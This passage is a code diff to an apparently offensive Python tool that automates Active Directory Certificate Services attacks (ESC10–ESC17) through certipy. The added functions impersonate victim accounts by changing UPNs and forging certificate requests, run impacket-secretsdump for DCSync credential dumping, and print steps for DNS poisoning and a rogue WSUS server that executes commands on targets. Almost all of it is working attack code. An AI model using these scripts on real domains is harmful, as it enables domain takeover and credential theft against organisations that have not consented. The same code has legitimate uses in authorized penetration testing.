+    rev_cmd = add_proxy_opts(f"{CERTIPY} account update -u {username}@{domain} -p {password} -user {victim} -upn {victim}@{domain}")
     print(f"{msg}: {cyan}{rev_cmd} {reset}")
     subprocess.call(rev_cmd, shell=True)
     print(f"{green}[+] Account permissions normal again for {red}{victim}{green} and {red}{victim2}{reset}")
 
-    a_cmd = add_proxy_opts(f"certipy auth -pfx {victim2}.pfx -domain {domain} -dc-ip {ip}")
+    a_cmd = add_proxy_opts(f"{CERTIPY} auth -pfx {victim2}.pfx -domain {domain} -dc-ip {ip}")
     print(f"{msg}: {cyan}{a_cmd} {reset}")
     subprocess.call(a_cmd, shell=True)
 
 def run_esc10_2():
     print(f"{green}[+] For this to work The CertificateMappingMethods needs to be set to {red}0x4{green}. However, as a normal user we cannot look at the registry key. This means we would just have to try the exploit{reset}")
     print(f"{green}[+] We also need full control over {red}{victim}{green} with {username}")
-    sha_cmd = add_proxy_opts(f"certipy shadow auto -u {username}@{domain} -p {password} -account {victim}")
+    sha_cmd = add_proxy_opts(f"{CERTIPY} shadow auto -u {username}@{domain} -p {password} -account {victim}")
     print(f"{msg} {cyan}{sha_cmd} {reset}")
     proc = subprocess.Popen(sha_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
     nt_hash = None
@@ -828,16 +861,16 @@ def run_esc10_2():
     nx = f"nxc smb {ip}"
     subprocess.call(nx, shell=True)
     victim1 = input(f"{cyan}[?] What user do you want to impersonate (ex: administrator): {reset}")
-    imp_cmd = add_proxy_opts(f"certipy account update -u {username}@{domain} -p {password} -user {victim} -upn {victim1}")
+    imp_cmd = add_proxy_opts(f"{CERTIPY} account update -u {username}@{domain} -p {password} -user {victim} -upn {victim1}")
     print(f"{msg} {cyan}{imp_cmd}{reset}")
     subprocess.call(imp_cmd, shell=True)
-    req_cmd = add_proxy_opts(f"certipy req -u {victim}@{domain} -hashes {nt_hash} -ca {ca} -template user")
+    req_cmd = add_proxy_opts(f"{CERTIPY} req -u {victim}@{domain} -hashes {nt_hash} -ca {ca} -template user")
     print(f"{msg} {cyan}{req_cmd} {reset}")
     subprocess.call(req_cmd, shell=True)
-    up_cmd = add_proxy_opts(f"certipy account update -u {username}@{domain} -p {password} -user {victim} -upn {victim}")
+    up_cmd = add_proxy_opts(f"{CERTIPY} account update -u {username}@{domain} -p {password} -user {victim} -upn {victim}")
     print(f"{msg} {cyan}{up_cmd} {reset}")
     subprocess.call(up_cmd, shell=True)
-    a_cmd = add_proxy_opts(f"certipy auth -pfx {victim1}.pfx -domain {domain} -dc-ip {ip}")
+    a_cmd = add_proxy_opts(f"{CERTIPY} auth -pfx {victim1}.pfx -domain {domain} -dc-ip {ip}")
     print(f"{msg} {cyan}{a_cmd} {reset}")
     subprocess.call(a_cmd, shell=True)
 
@@ -848,7 +881,7 @@ def run_esc11(ca):
     print(f"""{red}[!] You need to do the following in another shell:
         nxc smb <machine to coerce> -M coerce_plus -o LISTENER=<lhost> -o ALWAYS=True -o METHOD=<one of the following PetitPotam, DFSCoerce...""")
     
-    relay_cmd = f"sudo -E certipy relay -target rpc://{target_ip} -template DomainController -ca {ca} -template DomainController"
+    relay_cmd = f"sudo -E {CERTIPY} relay -target rpc://{target_ip} -template DomainController -ca {ca} -template DomainController"
     print(f"{msg}{relay_cmd}{reset}")
     
     # Only use Popen, not subprocess.call
@@ -866,11 +899,120 @@ def run_esc11(ca):
 
     if pfx_file:
         print(f"{green}[+] Detected saved PFX file: {pfx_file}{reset}")
-        auth_cmd = add_proxy_opts(f"certipy auth -pfx {pfx_file}")
+        auth_cmd = add_proxy_opts(f"{CERTIPY} auth -pfx {pfx_file}")
         print(f"{msg}{auth_cmd}{reset}")
         subprocess.call(auth_cmd, shell=True)
     else:
         print(f"{red}[-] Could not detect saved PFX file in certipy relay output. Please check manually.{reset}")
+
+def run_esc13(template, ca):
+    print(f"{green}[*] Running ESC13 attack using Template: {template}, CA: {ca}{reset}")
+    print(f"{yellow}[!] ESC13: Issuance policy linked to privileged group — cert grants group membership via TGT{reset}")
+
+    req_cmd = add_proxy_opts(f"{CERTIPY} req -u {username}@{domain} -p {password} -ca {ca} -target {target} -dc-ip {ip} -template {template}")
+    print(f"{msg} {cyan}{req_cmd}{reset}")
+    subprocess.call(req_cmd, shell=True)
+
+    a_cmd = add_proxy_opts(f"{CERTIPY} auth -pfx {username}.pfx -domain {domain} -dc-ip {ip}")
+    print(f"{msg} {cyan}{a_cmd}{reset}")
+    subprocess.call(a_cmd, shell=True)
+
+    dc_fqdn = input(f"{cyan}[?] DC FQDN for DCSync (e.g., NOVA.orion.local): {reset}")
+    print(f"{green}[+] TGT includes linked group's SID — running DCSync{reset}")
+
+    os.environ["KRB5CCNAME"] = f"{username}.ccache"
+    print(f"{green}[+] Set KRB5CCNAME={username}.ccache{reset}")
+
+    dcsync_cmd = f"impacket-secretsdump -k -no-pass -dc-ip {ip} -just-dc-user {victim} {domain}/{username}@{dc_fqdn}"
+    print(f"{msg} {cyan}{dcsync_cmd}{reset}")
+    subprocess.call(dcsync_cmd, shell=True)
+
+def run_esc15(template, ca):
+    print(f"{green}[*] Running ESC15 attack using Template: {template}, CA: {ca}{reset}")
+    print(f"{yellow}[!] ESC15: V1 schema template — injecting Client Auth application policy (CVE-2024-49019){reset}")
+
+    sid_cmd = add_proxy_opts(f"{CERTIPY} account -u {username}@{domain} -p {password} -dc-ip {ip} -user {victim} read")
+    print(f"{msg} Getting victim SID with: {cyan}{sid_cmd}{reset}")
+    sid = get_sid_from_command(sid_cmd)
+
+    if sid:
+        print(f"{green}[*] Victim SID is: {red}{sid}{reset}")
+    else:
+        print(f"{red}[-] Failed to extract SID for victim user {victim}{reset}")
+        return
+
+    req_cmd = add_proxy_opts(f"{CERTIPY} req -u {username}@{domain} -p {password} -ca {ca} -target {target} -dc-ip {ip} -template {template} -upn {victim} -sid {sid} -application-policies 1.3.6.1.5.5.7.3.2")
+    print(f"{msg} {cyan}{req_cmd}{reset}")
+    subprocess.call(req_cmd, shell=True)
+
+    a_cmd = add_proxy_opts(f"{CERTIPY} auth -pfx {victim}.pfx -domain {domain} -dc-ip {ip}")
+    print(f"{msg} {cyan}{a_cmd}{reset}")
+    subprocess.call(a_cmd, shell=True)
+
+def run_esc16(ca):
+    print(f"{green}[*] Running ESC16 attack using CA: {ca}{reset}")
+    print(f"{yellow}[!] ESC16: SID extension disabled globally — UPN mapping abuse from any template{reset}")
+
+    sid_cmd = add_proxy_opts(f"{CERTIPY} account -u {username}@{domain} -p {password} -dc-ip {ip} -user {victim} read")
+    print(f"{msg} Getting victim SID with: {cyan}{sid_cmd}{reset}")
+    sid = get_sid_from_command(sid_cmd)
+
+    if sid:
+        print(f"{green}[*] Victim SID is: {red}{sid}{reset}")
+    else:
+        print(f"{red}[-] Failed to extract SID for victim user {victim}{reset}")
+        return
+
+    req_cmd = add_proxy_opts(f"{CERTIPY} req -u {username}@{domain} -p {password} -ca {ca} -target {target} -dc-ip {ip} -template User -upn {victim} -sid {sid}")
+    print(f"{msg} {cyan}{req_cmd}{reset}")
+    subprocess.call(req_cmd, shell=True)
+
+    a_cmd = add_proxy_opts(f"{CERTIPY} auth -pfx {victim}.pfx -domain {domain} -dc-ip {ip}")
+    print(f"{msg} {cyan}{a_cmd}{reset}")
+    subprocess.call(a_cmd, shell=True)
+
+def run_esc17(template, ca):
+    print(f"{green}[*] Running ESC17 attack using Template: {template}, CA: {ca}{reset}")
+    print(f"{yellow}[!] ESC17: Server Auth + Enrollee Supplies Subject — requesting server cert for impersonation{reset}")
+
+    dns_name = input(f"{cyan}[?] DNS hostname to impersonate (e.g., wsus.orion.local): {reset}")
+
+    req_cmd = add_proxy_opts(f"{CERTIPY} req -u {username}@{domain} -p {password} -ca {ca} -target {target} -dc-ip {ip} -template {template} -dns {dns_name}")
+    print(f"{msg} {cyan}{req_cmd}{reset}")
+    subprocess.call(req_cmd, shell=True)
+
+    pfx_base = dns_name.split(".")[0]
+    print(f"\n{green}[+] Extracting cert and key from {pfx_base}.pfx{reset}")
+
+    cert_cmd = f"{CERTIPY} cert -pfx {pfx_base}.pfx -nokey -out {pfx_base}.crt"
+    key_cmd = f"{CERTIPY} cert -pfx {pfx_base}.pfx -nocert -out {pfx_base}.key"
+    print(f"{msg} {cyan}{cert_cmd}{reset}")
+    subprocess.call(cert_cmd, shell=True)
+    print(f"{msg} {cyan}{key_cmd}{reset}")
+    subprocess.call(key_cmd, shell=True)
+
+    print(f"\n{green}[+] Next steps (manual):{reset}")
+    print(f"{yellow}  1. Download the CA cert:{reset}")
+    print(f"{cyan}     curl -sk 'http://{target}/CertEnroll/<DC_DNS>_{ca}.crt' -o ca.crt{reset}")
+    print(f"{cyan}     openssl x509 -in ca.crt -inform DER -out ca.pem -outform PEM{reset}")
+    print(f"{cyan}     cat {pfx_base}.crt ca.pem > {pfx_base}-fullchain.crt{reset}")
+    print(f"{yellow}  2. Poison DNS (point {dns_name} to your IP):{reset}")
+    print(f"{cyan}     kinit {username}@{domain.upper()}{reset}")
+    print(f"{cyan}     nsupdate -g <<EOF{reset}")
+    print(f"{cyan}     server {ip}{reset}")
+    print(f"{cyan}     zone {domain}{reset}")
+    print(f"{cyan}     update add {dns_name} 300 A <YOUR_IP>{reset}")
+    print(f"{cyan}     send{reset}")
+    print(f"{cyan}     EOF{reset}")
+    print(f"{yellow}  3. Launch rogue server (e.g., for WSUS):{reset}")
+    print(f"{cyan}     sudo wsuks --serve-only --WSUS-Server {dns_name} --tls-cert {pfx_base}-fullchain.crt --tls-cert-key {pfx_base}.key -t {target} -c '<cmd>' -I <iface>{reset}")
+    print(f"{yellow}  4. Cleanup DNS when done:{reset}")
+    print(f"{cyan}     nsupdate -g <<EOF{reset}")
+    print(f"{cyan}     server {ip}{reset}")
+    print(f"{cyan}     zone {domain}{reset}")
+    print(f"{cyan}     update delete {dns_name} A{reset}")
+    print(f"{cyan}     send{reset}")
+    print(f"{cyan}     EOF{reset}")
 
 def main():
     # Handle ESC10 separately
@@ -889,7 +1031,7 @@ def main():
 
     # Handle --revert logic
     if args.revert:
-        vuln_file = run_certipy_find()
+        vuln_file = args.certipyfile if args.certipyfile else run_certipy_find()
         templates, _, _ = parse_find_output(vuln_file)
 
         # Search for template matching args.templ
@@ -902,8 +1044,8 @@ def main():
         revert_esc4(matched["template"], matched["ca"], args.json)
         return
 
-    # Run certipy find and parse output
-    vuln_file = run_certipy_find()
+    # Run certipy find and parse output (or reuse existing file with -c)
+    vuln_file = args.certipyfile if args.certipyfile else run_certipy_find()
     templates, ca_vulns, ca_name = parse_find_output(vuln_file)
 
     if five:
@@ -940,6 +1082,8 @@ def main():
                     run_esc8(ca_name)
                 elif chosen_ca_esc == "ESC11":
                     run_esc11(ca_name)
+                elif chosen_ca_esc == "ESC16":
+                    run_esc16(ca_name)
                 else:
                     print(f"{red}[-] No exploit logic written for {chosen_ca_esc}{reset}")
                 break
@@ -980,6 +1124,12 @@ def main():
         run_esc4(template_name, ca_name)
     elif selected_esc == "ESC9":
         run_esc9(template_name, ca_name)
+    elif selected_esc == "ESC13":
+        run_esc13(template_name, ca_name)
+    elif selected_esc == "ESC15":
+        run_esc15(template_name, ca_name)
+    elif selected_esc == "ESC17":
+        run_esc17(template_name, ca_name)
     else:
         print(f"{yellow}[!] Unsupported ESC selected: {selected_esc}{reset}")
 
